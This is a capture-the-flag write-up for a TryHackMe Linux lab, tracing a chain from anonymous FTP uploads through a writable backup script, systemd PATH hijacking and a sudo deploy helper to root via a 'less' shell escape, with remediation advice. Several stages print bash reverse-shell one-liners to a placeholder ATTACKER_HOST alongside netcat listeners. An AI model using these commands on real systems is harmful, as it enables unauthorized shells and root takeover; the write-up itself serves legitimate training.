# Linux Privilege Escalation

## From Anonymous FTP to Root Through Insecure Automation and Trust Relationships

**Platform:** TryHackMe

**Category:** Linux Privilege Escalation

**Operating System:** Ubuntu Linux

**Difficulty:** Intermediate

**Attack Vector:** Network Services and Local Privilege Escalation

**Techniques:** FTP Enumeration, Unrestricted Script Execution, Writable Backup Scripts, PATH Hijacking, systemd Misconfiguration, Sudo Abuse, GTFOBins

---

# 1. Executive Summary

This challenge demonstrates how multiple security misconfigurations within a Linux automation pipeline can be chained together to achieve complete system compromise.

The target machine hosted several automated processes responsible for reconnaissance tasks, development backups, system monitoring, and application deployment.

Although these processes operated under different user accounts, insecure permissions and poorly defined trust boundaries allowed a lower-privileged user to influence commands executed by more privileged accounts.

The objective was to escalate privileges through the following sequence:

```
Anonymous FTP
      |
      v
 recon_user
      |
      v
  dev_user
      |
      v
 monitor_user
      |
      v
   ops_user
      |
      v
     root
```

Five major security weaknesses were identified throughout the assessment:

| Stage | Vulnerability | Result |
| --- | --- | --- |
| Initial Access | Anonymous FTP with automated execution of uploaded scripts | `recon_user` |
| Stage 2 | Writable development backup script | `dev_user` |
| Stage 3 | PATH Hijacking in a systemd service | `monitor_user` |
| Stage 4 | Writable deployment helper combined with sudo permissions | `ops_user` |
| Stage 5 | Sudo misconfiguration involving the `less` utility | `root` |

Each stage required identifying how files, scripts, and services interacted with their execution environments.

Rather than relying on kernel vulnerabilities or software exploits, the attack chain primarily abused excessive permissions and insecure automation.

The final result was successful root access and retrieval of the final challenge flag.

---

# 2. Reconnaissance and Service Enumeration

## 2.1. Full TCP Port Scan

The assessment began with a full TCP port scan to identify exposed services.

```
nmap -Pn -sV -p- -T4 TARGET_HOST
```

The options used were:

- `Pn`: Skip host discovery and treat the target as online.
- `sV`: Attempt to identify service versions.
- `p-`: Scan all 65,535 TCP ports.
- `T4`: Use a faster scanning timing profile.

### Results

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
```

The scan identified two exposed services.

**FTP (TCP/21)** was selected as the primary enumeration target because FTP servers may expose files, permit anonymous authentication, or provide writable directories.

**SSH (TCP/22)** was also available, but no valid SSH credentials had been discovered at this stage.

The next objective was to determine whether the FTP server allowed unauthenticated access.

---

# 3. Initial Access — Anonymous FTP to recon_user

## 3.1. Anonymous FTP Authentication

I connected to the FTP service:

```
ftp TARGET_HOST
```

The server accepted anonymous authentication, allowing directory enumeration without a valid system account.

I listed the available files and directories:

```
ftp> ls -la
```

Relevant output:

```
drwxr-xr-x  4 0   0    4096 .
drwxr-xr-x  4 0   0    4096 ..
drwxrwxrwx  2 115 123  4096 incoming
drwxr-xr-x  4 115 123  4096 pub
```

The `incoming` directory immediately stood out.

Its permissions were:

```
drwxrwxrwx
```

This represented permission mode `777`, meaning all users had read, write, and execute permissions on the directory.

The configuration suggested that anonymous FTP users could upload files into `incoming`.

## 3.2. Enumerating the Public Directory

I continued exploring the FTP structure:

```
ftp> cd pub
ftp> ls -la
```

Output:

```
-rw-r--r--  1 0   0    139 README.txt
drwxr-xr-x  2 115 123  4096 archive
drwxrwxrwx  2 115 123  4096 uploads
```

Another writable directory, `uploads`, was identified.

More importantly, the public directory contained a `README.txt` file.

Its contents revealed how the automation pipeline operated:

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This provided a critical clue.

The server was not simply storing uploaded files. It was automatically processing files submitted to the `incoming` directory.

At this stage, the key question became:

**What does the server do with uploaded files, and under which user account does that processing occur?**

## 3.3. Testing the Upload Mechanism

My initial attempts involved uploading PHP-based files using extensions such as:

```
.php
.php3
.phtml
.php.xml
```

These attempts did not establish a reverse shell.

I then tested a Bash script:

```
#!/bin/bash
echo "The script executed successfully" > /srv/ftp/pub/uploads/success.txt
```

After uploading the test script to the processing directory, the expected output file appeared in `uploads`.

This confirmed that the automation pipeline could execute uploaded shell scripts.

The results demonstrated successful processing of a `.sh` file. The failed PHP tests did not, by themselves, prove that the server used an extension-only allowlist.

## 3.4. Understanding the Processing Script

After gaining access to the host, I examined the script responsible for processing incoming files:

```
cat /opt/recon/process.sh
```

Contents:

```
#!/bin/bash
/bin/bash /srv/ftp/incoming/* 2>/dev/null
rm -f /srv/ftp/incoming/*
```

This explained the behavior observed during the FTP tests.

The script passed files from the `incoming` directory directly to Bash:

```
/bin/bash /srv/ftp/incoming/*
```

It then removed the processed files:

```
rm -f /srv/ftp/incoming/*
```

### Security Analysis

The underlying vulnerability was the direct execution of files placed in an anonymously writable directory.

The FTP service crossed a critical trust boundary:

```
Untrusted FTP upload
         |
         v
Server-side automation
         |
         v
Bash execution
         |
         v
Commands run with the automation user's privileges
```

No effective trust verification was demonstrated between the upload operation and execution.

This created an opportunity for arbitrary command execution.

## 3.5. Establishing a Reverse Shell

After confirming that Bash scripts were executed, I prepared a reverse shell payload for the authorized TryHackMe environment.

```
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_HOST/4444 0>&1
```

The `ATTACKER_HOST` placeholder represents the listener address.

On the attacking machine, I started a Netcat listener:

```
nc -lvnp 4444
```

The options specify:

- `l`: Listen for incoming connections.
- `v`: Enable verbose output.
- `n`: Avoid DNS resolution.
- `p`: Specify the listening port.

After the script was processed, the listener received a connection.

The shell initially reported:

```
bash: cannot set terminal process group:
Inappropriate ioctl for device

bash: no job control in this shell
```

These messages are common when a Bash session lacks an interactive terminal.

They did not prevent command execution.

## 3.6. Confirming Initial Access

I verified the user context:

```
id
```

Output:

```
uid=1001(recon_user) gid=1001(recon_user)
groups=1001(recon_user),1002(dev_user),1005(devops)
```

The reverse shell was running as `recon_user`.

The first flag was obtained at this stage.

I later transitioned to a Meterpreter session to make interaction with the lab environment more manageable.

### Result

**Initial access achieved: `recon_user`**

### Root Cause

An anonymously writable FTP directory was connected to an automated process that executed uploaded content using Bash.

---

# 4. Privilege Escalation — recon_user to dev_user

## 4.1. Enumerating the Current Environment

After gaining access as `recon_user`, I began inspecting the local environment.

The system was running Ubuntu Linux with an AWS kernel:

```
cat /proc/version
```

Relevant output:

```
Linux version 6.17.0-1013-aws
x86_64-linux-gnu
```

Next, I enumerated local accounts:

```
cat /etc/passwd | grep /home
```

Relevant entries:

```
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
recon_user:x:1001:1001::/home/recon_user:/bin/sh
dev_user:x:1002:1002::/home/dev_user:/bin/sh
monitor_user:x:1003:1003::/home/monitor_user:/bin/sh
ops_user:x:1004:1004::/home/ops_user:/bin/sh
```

The account structure closely matched the privilege escalation path described by the challenge.

This suggested that the automation pipeline contained separate execution contexts for reconnaissance, development, monitoring, and operations.

## 4.2. Investigating Group Permissions

The initial `id` output revealed something particularly important:

```
groups=1001(recon_user),1002(dev_user),1005(devops)
```

The `recon_user` account belonged to the `dev_user` group.

This provided a potential opportunity to access files owned by that group.

I searched relevant directories for group-associated files:

```
find /home /opt /srv /usr/local /var \
  -type f \( -group dev_user -o -group devops \) \
  -printf '%M %u:%g %p\n' 2>/dev/null
```

This helped identify files accessible through supplementary group memberships.

During enumeration, I also found that the file `/home/dev_user/flag.txt` was readable from the current context.

However, accessing a file associated with another account is not equivalent to obtaining that account's execution privileges.

The objective remained to execute commands as `dev_user`.

## 4.3. Discovering the Development Backup Script

I inspected the development directory:

```
ls -laR /opt/dev
```

Relevant output:

```
drwxrwxr-x dev_user dev_user /opt/dev
-rwxrwxr-x dev_user dev_user /opt/dev/backup.sh
drwxr-xr-x dev_user dev_user /opt/dev/bin
```

The backup script had the following permissions:

```
-rwxrwxr-x
```

This corresponds to permission mode `775`.

The owner and group were both `dev_user`.

Because `recon_user` belonged to the `dev_user` group, group-write permission allowed modification of the script.

I inspected its contents:

```
cat /opt/dev/backup.sh
```

Original script:

```
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

The script generated a compressed archive of the reconnaissance user's home directory.

The output was written to:

```
/tmp/recon_backup.tgz
```

## 4.4. Identifying Periodic Execution

I observed that the archive was being updated approximately every minute.

This suggested that the backup script was executed periodically by an automated process.

The reasoning was straightforward:

1. The script generated a specific archive.
2. The archive was regularly updated.
3. The current user could modify the script.
4. If the scheduled process executed it under `dev_user`, modifications could run with that account's privileges.

The next step was to test this hypothesis.

## 4.5. Modifying the Backup Script

I appended a reverse shell command while preserving the original backup operation.

```
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/ATTACKER_HOST/4444 0>&1 &
```

The final `&` runs the reverse shell command in the background.

This allows the backup script to continue without waiting for the interactive session to terminate.

On the attacking machine:

```
nc -lvnp 4444
```

When the automated backup executed again, a connection was received.

## 4.6. Confirming Privilege Escalation

I verified the new session:

```
whoami
id
```

Output:

```
dev_user

uid=1002(dev_user) gid=1002(dev_user)
groups=1002(dev_user),1005(devops)
```

The execution context had successfully changed from `recon_user` to `dev_user`.

### Result

**Privilege escalation achieved: `recon_user → dev_user`**

### Root Cause

A periodically executed backup script was writable by a lower-privileged user through group permissions.

This allowed unauthorized modification of commands executed by the backup automation.

### Security Lesson

The permissions of automation scripts must be evaluated against the identity that executes them.

A script running with higher privileges must not be modifiable by users who should not possess those privileges.

---

# 5. Privilege Escalation — dev_user to monitor_user

## 5.1. Investigating Running Processes

With access to `dev_user`, I continued enumerating the system.

I used process inspection and `pspy` to identify automated processes running under other accounts.

A recurring monitoring process was discovered:

```
/usr/local/bin/healthcheck
```

I examined the script:

```
cat /usr/local/bin/healthcheck
```

Contents:

```
#!/bin/bash

echo "Running as: $(whoami)"

while true; do
    ps aux | grep -v grep
    sleep 5
done
```

The script continuously monitored running processes.

Every five seconds, it executed:

```
ps aux
```

The important detail was that `ps` was called without an absolute path.

Instead of:

```
/usr/bin/ps
```

the script simply used:

```
ps
```

This meant that the executable selected by the shell depended on the process's `PATH` environment variable.

## 5.2. Confirming the Execution Context

I examined the running process:

```
ps aux | grep healthcheck
```

The process was running under `monitor_user`.

A more detailed inspection confirmed that the monitoring script belonged to a process started under that account.

```
ps -o pid,ppid,user,group,args -p 599
```

Relevant output:

```
USER           COMMAND
monitor_user   /bin/bash /usr/local/bin/healthcheck
```

This established the next objective: identify a way to influence commands executed by `healthcheck`.

## 5.3. Inspecting the systemd Service

I examined the corresponding service configuration:

```
cat /etc/systemd/system/healthcheck.service
```

Output:

```
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The critical configuration was:

```
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
```

The first directory in the service's PATH was:

```
/opt/dev/bin
```

Since PATH is searched in order, an executable named `ps` inside `/opt/dev/bin` would be selected before `/usr/bin/ps`.

## 5.4. Checking Directory Permissions

I verified who controlled the directory:

```
ls -ld /opt/dev/bin
```

Output:

```
drwxr-xr-x 2 dev_user dev_user /opt/dev/bin
```

The directory was owned by `dev_user`.

Therefore, the current account could create or modify files within it.

This created a classic PATH Hijacking opportunity:

```
healthcheck.service
          |
          v
User=monitor_user
          |
          v
PATH=/opt/dev/bin:...
          |
          v
healthcheck executes "ps"
          |
          v
/opt/dev/bin/ps
          |
          v
Attacker-controlled command executes
as monitor_user
```

## 5.5. Understanding PATH Hijacking

PATH Hijacking occurs when a program executes a command by name and the environment resolves that name to an attacker-controlled executable.

In this challenge, the legitimate `ps` utility was located at:

```
/usr/bin/ps
```

However, the service searched `/opt/dev/bin` first.

The attacker did not need to overwrite the legitimate system binary.

Instead, modifying a file with the same name in the earlier PATH directory was sufficient.

This is an important distinction: **PATH Hijacking manipulates command resolution rather than replacing the actual system executable.**

## 5.6. Creating the Replacement Command

I modified the `ps` file inside the attacker-controlled directory:

```
cat << 'EOF' > /opt/dev/bin/ps
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_HOST/4445 0>&1
EOF
```

I then made it executable:

```
chmod +x /opt/dev/bin/ps
```

On the attacking machine:

```
nc -lvnp 4445
```

Because the healthcheck script executed `ps` repeatedly, the next invocation resolved to the replacement script.

The injected command ran within the security context of the monitoring service.

## 5.7. Confirming the New Access

The listener received the reverse shell connection, and the resulting session ran under `monitor_user`.

The corresponding challenge flag was obtained.

### Result

**Privilege escalation achieved: `dev_user → monitor_user`**

### Root Cause

A systemd service executed under `monitor_user` inherited a PATH containing a directory controlled by `dev_user`.

The service also invoked external commands without using absolute paths.

This allowed command substitution and execution under a more privileged account.

### Security Lesson

A service's execution environment is part of its security boundary.

Even if the main script is protected against modification, its dependencies can still be hijacked when PATH includes writable directories.

---

# 6. Privilege Escalation — monitor_user to ops_user

## 6.1. Enumerating Files Owned by ops_user

After obtaining access as `monitor_user`, I searched for files and directories owned by the next target account.

```
find / -user ops_user 2>/dev/null
```

Relevant results:

```
/opt/app
/usr/local/bin/deploy.sh
/home/ops_user
```

The deployment script was especially interesting because it was associated with the application directory.

I inspected it:

```
cat /usr/local/bin/deploy.sh
```

Contents:

```
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The script changed its working directory to `/opt/app` and executed a local helper script.

This created an important dependency:

```
deploy.sh
    |
    v
/opt/app/deploy_helper.sh
```

The next step was to determine whether the helper script could be modified.

## 6.2. Inspecting Application Permissions

I checked the contents and permissions of `/opt/app`:

```
ls -la /opt/app
```

Relevant output:

```
drwxr-xr-x ops_user     ops_user     /opt/app
drwxrwxr-x monitor_user monitor_user /opt/app/data
-rwxr-xr-x monitor_user monitor_user /opt/app/deploy_helper.sh
```

The parent directory belonged to `ops_user` and was not writable by `monitor_user`.

However, the helper script itself was owned by `monitor_user`.

Its permissions allowed the owner to modify the file.

This distinction was critical.

Even though the current user could not create arbitrary files in the parent directory, it could modify the contents of the existing helper script.

I inspected the helper:

```
cat /opt/app/deploy_helper.sh
```

Original contents:

```
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
```

## 6.3. Reviewing Sudo Permissions

I then checked the commands authorized through sudo:

```
sudo -l
```

The output included:

```
User monitor_user may run the following commands:

(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

This was the missing link.

The current account could execute `deploy.sh` as `ops_user` without entering a password.

The deployment script itself was not writable by `monitor_user`, but it executed a helper script that was.

The exploitable chain was:

```
monitor_user
      |
      | Can modify
      v
deploy_helper.sh
      |
      | Executed by
      v
deploy.sh
      |
      | sudo allows execution as
      v
ops_user
```

### Vulnerability Identified

**Writable Script Dependency Combined with Sudo Privileges**

The security failure was not simply the existence of a sudo rule.

The problem was that the sudo-authorized script depended on another executable file controlled by a lower-privileged user.

## 6.4. Modifying the Deployment Helper

I replaced the helper script's contents with a reverse shell:

```
cat << 'EOF' > /opt/app/deploy_helper.sh
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_HOST/4446 0>&1
EOF
```

Then I started a listener:

```
nc -lvnp 4446
```

## 6.5. Executing the Deployment Script

I invoked the authorized deployment command as `ops_user`:

```
sudo -u ops_user /usr/local/bin/deploy.sh
```

The main script executed:

```
./deploy_helper.sh
```

Because the helper had been modified, it established a reverse shell using the privileges of the deployment process.

The listener received the connection, confirming access as `ops_user`.

### Result

**Privilege escalation achieved: `monitor_user → ops_user`**

### Root Cause

A sudo-authorized script executed a dependency writable by a less-privileged account.

The privileged script trusted the integrity of a file that the caller could modify.

### Security Lesson

Protecting the primary sudo-authorized executable is not enough.

Every file executed or sourced by that executable must also be protected.

This includes helper scripts, configuration files, libraries, and other dependencies.

---

# 7. Final Privilege Escalation — ops_user to root

## 7.1. Reviewing Sudo Permissions

After obtaining access as `ops_user`, I checked the account's sudo permissions.

```
sudo -l
```

Relevant output:

```
User ops_user may run the following commands:

(root) NOPASSWD: /usr/bin/less
```

This indicated that `ops_user` could execute the `less` utility as root without supplying a password.

At first glance, this might appear relatively harmless because `less` is commonly used to view text files.

However, `less` supports interactive commands that can execute external programs.

This makes it dangerous when exposed through an overly permissive sudo configuration.

## 7.2. Researching the less Binary

I consulted GTFOBins, a reference for legitimate Unix utilities that can be abused under certain security configurations.

Reference:

[https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

GTFOBins documents that `less` supports shell escapes through its interactive interface.

When `less` is executed under sudo as root, commands launched through this feature can inherit that privileged context.

## 7.3. Preparing the Terminal

To improve terminal interaction, I used:

```
script /dev/null -c /bin/bash
```

Then:

```
export TERM=xterm
```

These commands can help stabilize interaction with a shell obtained through a reverse connection.

They were terminal preparation steps, not the vulnerability itself.

## 7.4. Executing less as root

I launched the authorized utility:

```
sudo /usr/bin/less /etc/passwd
```

This opened `/etc/passwd` in the `less` pager with root privileges.

Inside the interactive interface, I used the shell escape:

```
!/bin/bash
```

The `!` command in `less` allows execution of an external shell command.

Because `less` was already running with root privileges, the spawned shell inherited the privileged execution context.

## 7.5. Confirming Root Access

I verified the identity:

```
whoami
id
```

The shell returned:

```
root
```

This confirmed successful privilege escalation to the root account.

I then retrieved the final flag:

```
cat /root/flag.txt
```

### Result

**Privilege escalation achieved: `ops_user → root`**

The objective of the challenge was completed.

### Root Cause

The sudo policy allowed a non-root user to execute an interactive utility with root privileges.

Because the utility supported shell escapes, the user could launch an unrestricted shell from the privileged process.

### Security Lesson

Interactive utilities should be carefully evaluated before being included in sudo rules.

A program that appears read-only may expose additional functionality capable of executing commands.

---

# 8. Complete Attack Chain Analysis

The final compromise resulted from chaining five distinct misconfigurations.

```
┌───────────────────────────────┐
│         Anonymous FTP         │
└───────────────┬───────────────┘
                │
       Writable incoming/
       Automated Bash execution
                │
                ▼
┌───────────────────────────────┐
│           recon_user          │
└───────────────┬───────────────┘
                │
       dev_user group membership
       Writable backup.sh
                │
                ▼
┌───────────────────────────────┐
│            dev_user           │
└───────────────┬───────────────┘
                │
       Writable /opt/dev/bin/ps
       Insecure systemd PATH
                │
                ▼
┌───────────────────────────────┐
│          monitor_user         │
└───────────────┬───────────────┘
                │
       Writable deploy_helper.sh
       Sudo-authorized deploy.sh
                │
                ▼
┌───────────────────────────────┐
│            ops_user           │
└───────────────┬───────────────┘
                │
       NOPASSWD /usr/bin/less
       Interactive shell escape
                │
                ▼
┌───────────────────────────────┐
│              root             │
│        Full Compromise        │
└───────────────────────────────┘
```

The attack crossed several trust boundaries:

**Network to local execution:** Anonymous FTP uploads were executed by server-side automation.

**User to user:** A writable backup script allowed `recon_user` to execute commands as `dev_user`.

**Development to monitoring:** An insecure PATH allowed `dev_user` to influence commands executed by `monitor_user`.

**Monitoring to operations:** A modifiable deployment helper was executed through a sudo-authorized workflow.

**Operations to root:** An interactive utility granted through sudo provided unrestricted shell execution.

The common pattern was that lower-privileged accounts could influence code executed in higher-privileged contexts.

---

# 9. Security Findings and Remediation

| Finding | Root Cause | Impact | Recommended Mitigation |
| --- | --- | --- | --- |
| Anonymous FTP script execution | Untrusted files automatically executed by Bash | Initial remote code execution | Disable anonymous uploads and isolate untrusted files |
| Writable development backup | Excessive group-write permissions | Execution as `dev_user` | Restrict script modification permissions |
| Insecure systemd PATH | Writable directory preceding trusted binaries | Execution as `monitor_user` | Use absolute paths and trusted PATH entries |
| Writable deployment dependency | Privileged script executes an untrusted helper | Execution as `ops_user` | Protect all privileged script dependencies |
| Sudo access to `less` | Interactive utility permitted as root | Full root access | Remove unsafe sudo rules and enforce least privilege |

## 9.1. Secure File Upload and Processing

Uploaded files should never be executed directly without appropriate validation and isolation.

Recommended controls include:

- Disable anonymous FTP uploads unless explicitly required.
- Separate upload directories from executable content.
- Process untrusted files inside restricted environments.
- Avoid passing arbitrary uploaded files directly to shell interpreters.
- Restrict the privileges of automation accounts.
- Monitor unexpected file creation and script execution.

## 9.2. Protect Automated Scripts

Backup and maintenance scripts must be writable only by trusted administrators or specifically authorized service accounts.

Recommended controls include:

- Remove unnecessary group-write permissions.
- Review supplementary group memberships.
- Protect scripts against unauthorized modification.
- Monitor changes to automation files.
- Use dedicated service accounts with minimal privileges.

## 9.3. Harden systemd Services

systemd services should use trusted executable paths.

Instead of relying on:

```
ps aux
```

a privileged monitoring script should explicitly reference the expected binary:

```
/usr/bin/ps aux
```

The service should also avoid including writable directories in its PATH.

Using an absolute path reduces the risk of command substitution, although it does not eliminate all possible dependency attacks.

## 9.4. Protect Sudo Execution Chains

When a sudo-authorized script launches another executable, the integrity of the entire dependency chain must be considered.

Recommended controls include:

- Restrict write access to helper scripts.
- Review ownership and permissions of parent directories.
- Avoid executing dependencies from user-controlled locations.
- Validate all files and commands executed by privileged automation.
- Apply the principle of least privilege to sudo rules.

## 9.5. Restrict Dangerous Interactive Utilities

Interactive programs such as text editors, pagers, interpreters, and debugging tools may support external command execution.

Granting these programs elevated privileges can provide unintended paths to a privileged shell.

Sudo rules should authorize only the minimum required functionality.

Where possible, replace unrestricted interactive utilities with purpose-built commands that perform a narrowly defined task.

---

# 10. Lessons Learned

## 10.1. Privilege Escalation Is Often About Trust Relationships

This challenge did not require exploiting a kernel vulnerability.

Instead, every successful transition exploited a trust relationship between a lower-privileged account and a process executed with higher privileges.

Understanding who controls a file and who executes it was more important than searching for a known exploit.

## 10.2. Group Memberships Matter

The initial `recon_user` account belonged to the `dev_user` group.

This allowed modification of a script that was not owned by the current user.

Checking `id`, supplementary groups, and file permissions should therefore be part of every Linux privilege escalation assessment.

## 10.3. Automated Processes Create Attack Opportunities

Cron jobs, monitoring scripts, deployment systems, and scheduled backups frequently run without direct user interaction.

If an attacker can modify their inputs or dependencies, these processes can become privilege escalation mechanisms.

## 10.4. PATH Hijacking Does Not Require Modifying System Binaries

The monitoring stage demonstrated that an attacker can influence command resolution without modifying `/usr/bin/ps`.

A writable directory appearing earlier in PATH was enough to redirect execution to attacker-controlled content.

## 10.5. Sudo Permissions Must Be Evaluated Beyond Command Names

The final stage illustrated why permitting a program through sudo is not necessarily safe just because the program is commonly used for viewing files.

Its full functionality, including shell escapes and external command execution, must be considered.

## 10.6. Re-enumeration Is Essential

Each new account exposed a different set of files, permissions, services, and sudo rules.

The attack succeeded because enumeration was repeated after every successful transition.

---

# 11. Conclusion

This TryHackMe challenge demonstrated how multiple Linux security misconfigurations can be chained together to achieve full root compromise.

The initial entry point was an anonymously accessible FTP server that automatically executed uploaded reconnaissance scripts.

After gaining access as `recon_user`, excessive group permissions exposed a writable backup script, enabling execution as `dev_user`.

The development account could then manipulate the executable search path used by a systemd monitoring service, resulting in command execution as `monitor_user`.

Further enumeration revealed a deployment helper script writable by the monitoring account. Combined with a sudo rule permitting execution of the deployment workflow as `ops_user`, this provided another privilege escalation path.

Finally, the operations account was authorized to execute `less` as root without authentication. The pager's shell escape functionality enabled an unrestricted root shell, allowing retrieval of the final challenge flag.

The entire attack chain demonstrates a fundamental security principle:

**Privilege escalation often succeeds not because individual components are inherently vulnerable, but because insecure permissions and trust relationships allow one security context to control code executed by another.**

The key defensive lessons are to enforce least privilege, protect automated scripts, restrict writable execution paths, audit sudo permissions, and validate every dependency used by privileged processes.

**Final outcome: Successful privilege escalation from anonymous FTP access to root.**

---

# 12. Skills Demonstrated

- Network reconnaissance and Nmap service enumeration
- Anonymous FTP enumeration
- Identification of insecure file upload processing
- Reverse shell establishment and validation
- Linux user and group enumeration
- File ownership and permission analysis
- Automated backup script exploitation
- Process monitoring using `pspy`
- systemd service inspection
- PATH Hijacking
- Analysis of privileged script dependencies
- Sudo permission enumeration
- GTFOBins research and shell escape exploitation
- Root access verification
- Technical vulnerability documentation and remediation

---

# 13. References

**Nmap — Network Scanning Documentation**

[https://nmap.org/book/man.html](https://nmap.org/book/man.html)

**GTFOBins — less**

[https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

**Linux Manual Pages — sudoers**

[https://man7.org/linux/man-pages/man5/sudoers.5.html](https://man7.org/linux/man-pages/man5/sudoers.5.html)

**systemd.exec — Execution Environment Configuration**

[https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html](https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html)

**MITRE ATT&CK — Hijack Execution Flow (T1574)**

[https://attack.mitre.org/techniques/T1574/](https://attack.mitre.org/techniques/T1574/)

**MITRE ATT&CK — Scheduled Task/Job (T1053)**

[https://attack.mitre.org/techniques/T1053/](https://attack.mitre.org/techniques/T1053/)